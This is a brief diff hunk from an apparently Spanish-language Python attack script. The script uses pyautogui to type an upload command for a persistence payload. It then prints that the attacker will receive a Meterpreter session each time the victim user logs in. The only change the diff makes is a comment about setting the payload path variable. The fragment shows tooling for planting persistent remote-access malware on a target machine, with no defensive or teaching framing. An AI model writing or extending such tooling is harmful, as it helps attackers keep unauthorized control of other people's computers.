@@ -525,7 +525,7 @@ if numero == 4:
 		   """)
              
              
-             pyautogui.write("upload " + path_payload_pers +"")
+             pyautogui.write("upload " + path_payload_pers +"")# añadir variable path del payload
              print("CADA VEZ QUE EL USUARIO INICIE SESION RECIBIRÁ UNA SESION METERPRETER")
              print("""
        
